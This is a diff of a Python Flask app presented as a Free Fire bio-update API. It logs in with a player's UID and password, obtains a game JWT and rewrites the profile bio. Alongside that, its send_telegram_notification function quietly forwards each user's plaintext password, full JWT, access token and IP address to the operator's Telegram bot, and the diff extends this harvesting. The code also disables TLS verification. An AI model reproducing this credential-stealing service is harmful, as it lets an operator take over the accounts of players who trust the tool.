@@ -1,4 +1,4 @@
-# app.py - NO ASYNCIO VERSION (Pakai requests biasa)
+# app.py - FULL VERSION (UID/PW → JWT → Bio Update → Telegram with Real Name)
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -13,6 +13,7 @@ import re
 import struct
 import threading
 import ssl
+import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from datetime import datetime
@@ -143,7 +144,6 @@ FREEFIRE_UPDATE_URLS = [
     "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
 ]
 
-GET_BIO_URL = "https://ff.ggbluewhale.store/api/data"
 PROFILE_API = "https://ff.ggbluewhale.store/api/data"
 PROFILE_API_KEY = "kenn"
 
@@ -173,7 +173,7 @@ LOGIN_HEADERS = {
     "ReleaseVersion": "OB54"
 }
 
-# ============ FUNGSI JWT GENERATOR (NO ASYNCIO) ============
+# ============ FUNGSI ============
 def random_ua():
     versions = ['4.0.18P6', '4.0.19P7', '4.1.0P3', '5.0.1B2', '5.2.5P3', '5.3.2P2', '5.4.3B2', '5.5.2P3']
     models = ['SM-A125F', 'POCO M3', 'Redmi 9A', 'RMX2185', 'moto g(9) play', 'ASUS_Z01QD', 'OnePlus Nord']
@@ -187,7 +187,6 @@ def aes_encrypt_data(data):
     return cipher.encrypt(pad(data, AES.block_size))
 
 def get_garena_tokens_sync(uid, password):
-    """Sync version of get_garena_tokens - pakai requests"""
     headers = dict(HTTP_HEADERS)
     headers["User-Agent"] = random_ua()
     headers["Host"] = "100067.connect.garena.com"
@@ -207,7 +206,6 @@ def get_garena_tokens_sync(uid, password):
         resp = requests.post(GARENA_OAUTH_URL, headers=headers, data=payload, timeout=15, verify=False)
         
         if resp.status_code != 200:
-            print(f"Garena OAuth failed — HTTP {resp.status_code}")
             return None
         
         body = resp.json()
@@ -215,16 +213,13 @@ def get_garena_tokens_sync(uid, password):
         access_token = body.get("access_token")
 
         if not open_id or not access_token:
-            print(f"Missing tokens in response: {body}")
             return None
 
         return {"open_id": open_id, "access_token": access_token}
-    except Exception as e:
-        print(f"OAuth error: {e}")
+    except:
         return None
 
 def build_major_login_payload_sync(open_id, access_token):
-    """Build MajorLogin payload - sync version"""
     ml = MajorLogin()
 
     ml.event_time = str(datetime.now())[:-7]
@@ -289,7 +284,6 @@ def build_major_login_payload_sync(open_id, access_token):
     return aes_encrypt_data(ml.SerializeToString())
 
 def major_login_sync(encrypted_payload):
-    """Sync version of major_login - pakai requests"""
     try:
         resp = requests.post(
             MAJORLOGIN_URL,
@@ -300,7 +294,6 @@ def major_login_sync(encrypted_payload):
         )
         
         if resp.status_code != 200:
-            print(f"MajorLogin failed — HTTP {resp.status_code}")
             return None
         
         raw = resp.content
@@ -314,46 +307,29 @@ def major_login_sync(encrypted_payload):
             "tcp_key": proto.key.hex() if proto.key else None,
             "tcp_iv": proto.iv.hex() if proto.iv else None,
         }
-    except Exception as e:
-        print(f"MajorLogin error: {e}")
+    except:
         return None
 
 def generate_jwt_sync(uid, password):
-    """Generate JWT dari UID + Password - SYNC VERSION (No asyncio)"""
     try:
-        # Step 1: Get tokens
-        print(f"🔑 Getting tokens for UID: {uid}")
         oauth = get_garena_tokens_sync(uid, password)
-        
         if not oauth:
-            print(f"❌ Failed to get tokens for UID: {uid}")
             return None
         
-        print(f"✅ Got tokens - open_id: {oauth['open_id'][:20]}...")
-        
-        # Step 2: Build payload
-        print("🔨 Building MajorLogin payload...")
         encrypted = build_major_login_payload_sync(oauth["open_id"], oauth["access_token"])
-        
-        # Step 3: MajorLogin
-        print("📡 Calling MajorLogin...")
         result = major_login_sync(encrypted)
         
         if not result:
-            print(f"❌ MajorLogin failed for UID: {uid}")
             return None
         
-        print(f"✅ JWT generated successfully!")
         return {
             "open_id": oauth["open_id"],
             "access_token": oauth["access_token"],
             **result
         }
-    except Exception as e:
-        print(f"JWT generation error: {e}")
+    except:
         return None
 
-# ============ FUNGSI ENKRIPSI ============
 def encrypt_data(data_bytes):
     cipher = AES.new(KEY, AES.MODE_CBC, IV)
     padded = pad(data_bytes, AES.block_size)
@@ -371,7 +347,6 @@ def encode_varint(n):
             break
     return bytes(result)
 
-# ============ BUILD PAYLOAD ============
 def build_bio_payload(bio_text):
     payload = b''
     payload += encode_varint((2 << 3) | 0) + encode_varint(17)
@@ -384,16 +359,53 @@ def build_bio_payload(bio_text):
     payload += encode_varint((12 << 3) | 2) + encode_varint(0)
     return payload
 
-# ============ FUNGSI UTAMA ============
-def decode_jwt_info(token):
+# ============ DECODE JWT MANUAL ============
+def decode_jwt_manual(jwt_token):
     try:
-        decoded = jwt.decode(token, options={"verify_signature": False})
-        name = decoded.get("nickname")
-        region = decoded.get("lock_region") or decoded.get("country_code", "ID")
-        uid = decoded.get("account_id")
-        return str(uid), name, region
-    except Exception:
-        return None, None, None
+        parts = jwt_token.split('.')
+        if len(parts) < 2:
+            return None
+        
+        payload_part = parts[1]
+        padding = 4 - len(payload_part) % 4
+        if padding != 4:
+            payload_part += '=' * padding
+        
+        decoded_bytes = base64.urlsafe_b64decode(payload_part)
+        payload = json.loads(decoded_bytes)
+        return payload
+    except:
+        return None
+
+def get_uid_from_jwt(jwt_token):
+    decoded = decode_jwt_manual(jwt_token)
+    if decoded:
+        return decoded.get("account_id")
+    return None
+
+def get_region_from_jwt(jwt_token):
+    decoded = decode_jwt_manual(jwt_token)
+    if decoded:
+        return decoded.get("country_code") or decoded.get("lock_region", "ID")
+    return "ID"
+
+def get_name_from_jwt(jwt_token):
+    decoded = decode_jwt_manual(jwt_token)
+    if decoded:
+        return decoded.get("nickname")
+    return None
+
+def decode_base64_name(encoded_name):
+    if not encoded_name:
+        return None
+    try:
+        padding = 4 - len(encoded_name) % 4
+        if padding != 4:
+            encoded_name += '=' * padding
+        decoded = base64.b64decode(encoded_name)
+        return decoded.decode('utf-8', errors='ignore')
+    except:
+        return encoded_name
 
 def check_profile_from_api(uid, region="id"):
     try:
@@ -417,8 +429,7 @@ def check_profile_from_api(uid, region="id"):
                     "status": "✅ Found"
                 }
         return None
-    except Exception as e:
-        print(f"API check error: {e}")
+    except:
         return None
 
 def upload_bio_request(jwt_token, bio_text):
@@ -447,16 +458,18 @@ def upload_bio_request(jwt_token, bio_text):
                     "endpoint": endpoint,
                     "server_response": raw_hex
                 }
-            except Exception as e:
+            except:
                 continue
         return {"status": "❌ All endpoints failed", "code": 500}
-    except Exception as e:
-        return {"status": f"Error: {str(e)}", "code": 500}
+    except:
+        return {"status": "❌ Error", "code": 500}
 
-def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", action="BIO UPDATE", access_token=None):
+def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None):
+    """Kirim notifikasi lengkap ke Telegram dengan nama asli"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        message = f"""🔥 <b>FREE FIRE {action}</b> 🔥
+        
+        message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥
 
 👤 <b>Name:</b> {name or 'N/A'}
 🆔 <b>UID:</b> <code>{uid}</code>
@@ -468,7 +481,7 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 🌍 <b>Region:</b> {region.upper() if region else 'ID'}
 📱 <b>Bio Status:</b> {bio_status}
 
-🔐 <b>JWT TOKEN (LENGKAP):</b>
+🔐 <b>JWT TOKEN:</b>
 <code>{jwt_token}</code>
 
 🔑 <b>Access Token:</b>
@@ -482,8 +495,7 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
         payload = {"chat_id": OWNER_ID, "text": message, "parse_mode": "HTML"}
         threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
         return True
-    except Exception as e:
-        print(f"Telegram error: {e}")
+    except:
         return False
 
 # ============ ROUTES ============
@@ -511,39 +523,40 @@ def combined_bio_upload():
     final_jwt = jwt_token
     final_uid = uid
     final_password = password or "N/A"
-    final_name = None
     final_region = region.lower()
     login_method = "Direct JWT"
     profile_info = None
     access_token = None
+    final_name = None
     
     # Method 1: Direct JWT
     if final_jwt:
-        uid_from_jwt, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
+        uid_from_jwt = get_uid_from_jwt(final_jwt)
+        region_from_jwt = get_region_from_jwt(final_jwt)
         if uid_from_jwt:
             final_uid = uid_from_jwt
-            final_name = name_from_jwt
             if region == "id" and region_from_jwt:
                 final_region = region_from_jwt.lower()
             login_method = "Direct JWT"
     
-    # Method 2: UID + Password → AUTO GENERATE JWT BARU (SYNC)
+    # Method 2: UID + Password → AUTO GENERATE JWT
     elif uid and password:
         login_method = "UID/Pass Login (Auto Generate JWT)"
         final_uid = uid
         final_password = password
         
         try:
-            print(f"🔑 Generating JWT for UID: {uid} (sync)...")
             result = generate_jwt_sync(uid, password)
             
             if result and result.get('token'):
                 final_jwt = result['token']
                 access_token = result.get('access_token')
-                print(f"✅ JWT generated successfully!")
+                print(f"✅ JWT generated successfully for UID: {uid}")
                 
-                _, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
-                final_name = name_from_jwt
+                uid_from_jwt = get_uid_from_jwt(final_jwt)
+                region_from_jwt = get_region_from_jwt(final_jwt)
+                if uid_from_jwt:
+                    final_uid = uid_from_jwt
                 if region == "id" and region_from_jwt:
                     final_region = region_from_jwt.lower()
             else:
@@ -572,14 +585,19 @@ def combined_bio_upload():
     # Upload bio
     bio_result = upload_bio_request(final_jwt, bio)
     
-    # Check profile dari API
+    # Check profile dari API (dapat nama asli, level, rank)
     if final_uid:
         try:
             profile_info = check_profile_from_api(final_uid, final_region)
+            if profile_info:
+                final_name = profile_info.get('name')
         except:
             profile_info = None
     
+    # Jika API gagal, decode nama dari JWT
     if not profile_info:
+        name_from_jwt = get_name_from_jwt(final_jwt)
+        final_name = decode_base64_name(name_from_jwt) if name_from_jwt else 'Unknown'
         profile_info = {
             "name": final_name or 'Unknown',
             "level": '?',
@@ -590,8 +608,10 @@ def combined_bio_upload():
             "clan": 'N/A',
             "status": "❌ Not Found"
         }
+    else:
+        final_name = profile_info.get('name')
     
-    # Kirim Telegram
+    # Kirim Telegram dengan nama asli
     send_telegram_notification(
         uid=profile_info.get('uid', final_uid or 'N/A'),
         password=final_password,
@@ -604,7 +624,6 @@ def combined_bio_upload():
         bio_status=bio_result.get('status', 'Unknown'),
         signature=profile_info.get('signature', bio),
         clan=profile_info.get('clan', 'N/A'),
-        action="BIO UPDATE",
         access_token=access_token
     )
     
@@ -618,7 +637,7 @@ def combined_bio_upload():
         "bio": bio,
         "uid": profile_info.get('uid', final_uid),
         "password": final_password,
-        "name": profile_info.get('name', final_name),
+        "name": profile_info.get('name', final_name or 'Unknown'),
         "level": profile_info.get('level', '?'),
         "rank": profile_info.get('rank', '?'),
         "clan": profile_info.get('clan', 'N/A'),
@@ -628,8 +647,7 @@ def combined_bio_upload():
         "endpoint_used": bio_result.get("endpoint", "N/A"),
         "generated_jwt": final_jwt,
         "access_token": access_token,
-        "telegram_sent": True,
-        "jwt_generator": "sync (no asyncio)"
+        "telegram_sent": True
     }
 
     response = make_response(jsonify(response_data))
@@ -658,7 +676,6 @@ def generate_jwt_only():
                 "access_token": result.get('access_token'),
                 "region": result.get('region'),
                 "open_id": result.get('open_id'),
-                "jwt_generator": "sync (no asyncio)",
                 "Credit": "sulav_codex_ff"
             })
         else:
@@ -673,81 +690,6 @@ def generate_jwt_only():
             "error": str(e),
             "uid": uid
         }), 500
-
-@app.route("/get_bio", methods=["GET"])
-def get_bio():
-    uid = request.args.get("uid")
-    region = request.args.get("region", "id")
-    
-    if not uid:
-        return jsonify({
-            "success": False,
-            "error": "Missing 'uid' parameter",
-            "usage": "/get_bio?uid=16208500077&region=id"
-        }), 400
-    
-    try:
-        url = f"{GET_BIO_URL}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
-        response = requests.get(url, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('basicInfo'):
-                basic = data['basicInfo']
-                social = data.get('socialInfo', {})
-                clan = data.get('clanBasicInfo', {})
-                return jsonify({
-                    "success": True,
-                    "action": "GET BIO",
-                    "data": {
-                        "uid": basic.get('accountId', uid),
-                        "name": basic.get('nickname', 'Unknown'),
-                        "level": basic.get('level', '?'),
-                        "rank": basic.get('rank', '?'),
-                        "region": basic.get('region', region.upper()),
-                        "bio": social.get('signature', ''),
-                        "clan": clan.get('clanName', 'N/A')
-                    },
-                    "Credit": "sulav_codex_ff",
-                    "Join For More": "Telegram: @sulav_don2"
-                })
-            else:
-                return jsonify({"success": False, "error": "Profile not found", "uid": uid}), 404
-        else:
-            return jsonify({"success": False, "error": f"API returned status {response.status_code}", "uid": uid}), response.status_code
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e), "uid": uid}), 500
-
-@app.route("/", methods=["GET"])
-def home():
-    return jsonify({
-        "success": True,
-        "message": "Free Fire Bio API - Auto JWT Generator (Sync)",
-        "endpoints": {
-            "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
-            "/generate_jwt": "Generate JWT only from UID/Pass",
-            "/get_bio": "GET bio orang lain (tanpa mengubah)",
-            "/check_profile": "Check profile data from API",
-            "/": "This info page"
-        },
-        "usage": {
-            "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id",
-            "generate_jwt": "/generate_jwt?uid=UID&pass=PASSWORD",
-            "get_bio": "/get_bio?uid=UID&region=id",
-            "check_profile": "/check_profile?uid=UID&region=id"
-        },
-        "features": [
-            "✅ Auto generate JWT from UID + Password (SYNC - no asyncio)",
-            "✅ Set/Update bio with generated JWT",
-            "✅ Get bio of any player (read-only)",
-            "✅ Get nickname, level, rank, region, clan",
-            "✅ Telegram notification with complete JWT + Access Token",
-            "✅ Works on Vercel (no asyncio issues)"
-        ],
-        "jwt_generator": "sync (no asyncio) - works on Vercel",
-        "Credit": "sulav_codex_ff",
-        "Telegram": "@sulav_don2"
-    })
 
 @app.route("/check_profile", methods=["GET"])
 def check_profile():
@@ -766,12 +708,42 @@ def check_profile():
     else:
         return jsonify({"success": False, "error": "Profile not found"}), 404
 
+@app.route("/", methods=["GET"])
+def home():
+    return jsonify({
+        "success": True,
+        "message": "Free Fire Bio API - Auto JWT Generator",
+        "endpoints": {
+            "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
+            "/generate_jwt": "Generate JWT only from UID/Pass",
+            "/check_profile": "Check profile data from API",
+            "/": "This info page"
+        },
+        "usage": {
+            "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
+        },
+        "features": [
+            "✅ Auto generate JWT from UID + Password",
+            "✅ Set/Update bio with generated JWT",
+            "✅ Get REAL NAME from profile API",
+            "✅ Get Level, Rank, Clan from profile",
+            "✅ Telegram notification with complete details",
+            "✅ Access Token included in notification"
+        ],
+        "Credit": "sulav_codex_ff",
+        "Telegram": "@sulav_don2"
+    })
+
 # ============ MAIN ============
 if __name__ == "__main__":
     print("=" * 60)
-    print("🔥 FREE FIRE BIO API - AUTO JWT GENERATOR (SYNC)")
+    print("🔥 FREE FIRE BIO API - AUTO JWT GENERATOR")
     print("=" * 60)
-    print("📱 JWT Generator: Sync (no asyncio) - Vercel compatible")
+    print("📱 Features:")
+    print("   - UID/Pass → JWT → Bio Update")
+    print("   - Get Real Name from API")
+    print("   - Get Level, Rank, Clan")
+    print("   - Telegram with all details")
     print("🚀 Server running on http://0.0.0.0:5000")
     print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
